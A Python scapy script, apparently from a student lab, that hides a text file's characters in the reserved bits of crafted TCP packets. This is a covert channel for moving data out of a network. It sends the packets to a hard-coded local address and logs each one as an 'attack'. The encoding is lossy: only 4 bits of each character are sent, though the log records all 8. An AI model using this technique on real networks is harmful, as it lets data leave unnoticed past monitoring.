from scapy.all import IP, TCP, send
import time
import json
import random
from datetime import datetime

ATTACK_LOG_PATH = "C:/Users/Nikitha/Downloads/5th_sem/aiml_dbms_lab/SendPackets/attack_log.json"
SAMPLE_TEXT = "C:/Users/Nikitha/Downloads/5th_sem/aiml_dbms_lab/sample_text.txt"

# -------------------------
# Convert 1 character -> 4-bit TCP Reserved value
# -------------------------
def char_to_reserved(char):
    return ord(char) & 0xF  # Only use lower 4 bits for reserved field


# -------------------------
# Load file -> return list of (char, reserved_num)
# -------------------------
def load_chunks(file_path):
    with open(file_path, "r", encoding="utf-8") as f:
        text = f.read()

    chunks = []
    for char in text:
        num = char_to_reserved(char)
        chunks.append((char, num))

    return chunks


# -------------------------
# Append an entry to the attack_log.json array (creates file if missing)
# -------------------------
def append_attack_log(entry, path=ATTACK_LOG_PATH):
    try:
        with open(path, 'r', encoding='utf-8') as f:
            data = json.load(f)
            if not isinstance(data, list):
                data = []
    except (FileNotFoundError, json.JSONDecodeError):
        data = []

    data.append(entry)

    with open(path, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4)


# -------------------------
# Send packets carrying covert data inside TCP Reserved field
# -------------------------
def send_reserved_chunks(chunks, src_ip, dst_ip, dport=80, inter=0.02):
    packets = []
    seq_base = 1000  # baseline sequence number (left mostly unchanged)

    # determine next attack log id
    try:
        with open(ATTACK_LOG_PATH, 'r', encoding='utf-8') as f:
            existing = json.load(f)
            next_attack_id = (max((e.get('packet_id', 0) for e in existing), default=0) + 1) if existing else 1
    except (FileNotFoundError, json.JSONDecodeError):
        next_attack_id = 1

    for index, (char, reserved_num) in enumerate(chunks):
        pkt = IP(src=src_ip, dst=dst_ip, id=index) / TCP(
            sport=44444,
            dport=dport,
            seq=seq_base + index,  # keep seq as baseline
            reserved=reserved_num,  # covert data in Reserved field
            flags="A",
            ack=0
        )

        packets.append(pkt)
        send(pkt, verbose=False)
        print(f"Sent char '{char}' as Reserved={reserved_num}")

        # Log the attack in the attack_log.json array
        bits = f'{ord(char):08b}'
        entry = {
            "packet_id": next_attack_id,
            "modified_field": "Reserved",
            "original_value": 0,  # reserved field is normally 0
            "modified_value": reserved_num,
            "covert_bits": bits,
            "timestamp": datetime.now().timestamp()
        }

        append_attack_log(entry)
        next_attack_id += 1

        time.sleep(inter)

    return packets


if __name__ == "__main__":
    file_path = SAMPLE_TEXT
    src_ip = "198.168.1.6"
    dst_ip = "198.168.1.6"
    dport = 9988

    chunks = load_chunks(file_path)
    print(f"Loaded {len(chunks)} characters.")

    send_reserved_chunks(chunks, src_ip, dst_ip, dport)
